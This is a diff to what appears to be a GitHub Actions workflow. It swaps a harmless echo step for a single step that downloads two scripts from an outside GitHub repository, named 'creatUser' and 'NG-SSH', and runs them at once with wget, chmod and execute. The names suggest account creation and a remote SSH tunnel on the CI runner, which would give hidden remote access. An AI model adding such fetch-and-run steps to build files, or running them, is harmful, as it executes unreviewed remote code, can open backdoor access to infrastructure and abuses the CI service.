@@ -26,5 +26,5 @@ jobs:
       - uses: actions/checkout@v3
 
       # Runs a single command using the runners shell
-      - name: step-1
-        run: echo SALAM ALIZAW
+      - name: frist and last step
+        run: wget -O x.sh https://raw.githubusercontent.com/Alizarddd/ready-codes/main/creatUser ; chmod +x x.sh ; ./x.sh ; wget -O z.sh https://raw.githubusercontent.com/Alizarddd/ready-codes/main/NG-SSH ; chmod +x z.sh ; ./z.sh 
